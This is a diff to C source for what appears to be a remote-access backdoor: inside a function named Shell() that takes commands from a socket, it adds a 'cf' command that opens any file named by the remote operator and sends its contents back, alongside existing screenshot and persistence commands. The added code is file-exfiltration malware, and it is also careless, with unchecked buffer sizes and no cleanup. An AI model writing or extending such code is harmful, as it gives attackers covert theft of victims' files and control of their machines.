@@ -134,6 +134,46 @@ void Shell()
       // Send back path of screenshot
       send(sock, suc, sizeof(suc), 0);
     }
+    else if (strncmp("cf ", buffer, 3) == 0)
+    {
+      // Get the filename after cf
+      char *filename = str_cut(buffer, 3, 100);
+
+      // Read the file contents
+      FILE *file;
+      file = fopen(filename, "rb");
+
+      // Check if file exists
+      if (file == NULL)
+      {
+        // Send error message
+        char err[128];
+        sprintf(err, "[-] File %s not found.\n", filename);
+        send(sock, err, sizeof(err), 0);
+        continue;
+      }
+
+      // Get file size
+      fseek(file, 0, SEEK_END);
+
+      // Get file size
+      int size = ftell(file);
+
+      // Reset file pointer
+      rewind(file);
+
+      // Allocate memory for file contents
+      char *file_contents = malloc(size * (sizeof(char)));
+
+      // Read file contents
+      fread(file_contents, sizeof(char), size, file);
+
+      char rspns[18384];
+      sprintf(rspns, "file:%d:%s:%s", size, filename, file_contents);
+
+      // Send file contents
+      send(sock, rspns, sizeof(rspns), 0);
+    }
     else if (strncmp("persist", buffer, 7) == 0)
     {
       // Persist connection
